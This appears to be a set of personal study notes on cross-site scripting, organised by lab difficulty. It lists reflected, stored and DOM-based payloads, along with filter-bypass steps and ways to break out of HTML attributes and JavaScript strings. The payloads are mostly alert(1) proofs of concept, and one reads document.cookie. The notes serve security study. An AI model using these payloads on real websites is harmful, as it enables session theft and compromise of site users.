# basic attack

#apprentice 
#### reflected
in [[cause & sinks#reflected|this]] case: 
> https://insecure-website.com/search?term=`<script>alert(1)</script>`
#### stored
in [[cause & sinks#stored|this]] case:
> comment=`<script>alert(1)</script>`
#### DOM-based
in [[cause & sinks#DOM-based|this]] case
> `"><svg onload=alert(1)>`

# contexts
## between HTML tags
##### most tags and attributes blocked
#practitioner 
`<>` -> `<§§>` -> body tag accepted ->`<body%20§§=1>` -> `onresize` accepted -> `<iframe src="https://vulnerable-website.com/?search="><body onresize=print()>" onload=this.style.width='100px'>`
##### all tags and attributes blocked except custom ones
#practitioner 
`<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x'`
##### some SVG markup allowed
#practitioner 
`<>` -> `<§§>` -> `<svg>`, `<animatetransform>`, `<title>`,`<image>` accepted-> `<svg><animatetransform%20§§=1>` -> `onbegin` accepted-> `"><svg><animatetransform onbegin=alert(1)>`
## in HTML tag attributes

- **close the tag** ->  `"><script>alert(1)</script>`
- **same tag** -> **new attribute** ->
	- `" autofocus onfocus=alert(1) x="` (`x="` to gracefully repair the following markup
	- #apprentice 
	  `"onmouseover="alert(1)`
- **same tag** -> **same attribute** 
	 -  #apprentice 
	   `<a href="javascript:alert(1)">`
	 - #practitioner 
	   hidden input -> `https://vulnerable-website.com/?'accesskey='x'onclick='alert(1)`
## XSS into JavaScript

##### Terminating the existing script 
`<script> ... var input = 'controllable data here'; ... </script>` 
- `</script><img src=1 onerror=alert(document.domain)>` (reason:HTML parsing first)
- #practitioner 
   single quote and backslash escaped -> `</script><script>alert(1)</script>`
##### Breaking out of a JavaScript string
- #apprentice 
  `'-alert(1)-'`
- `';alert(1)//`
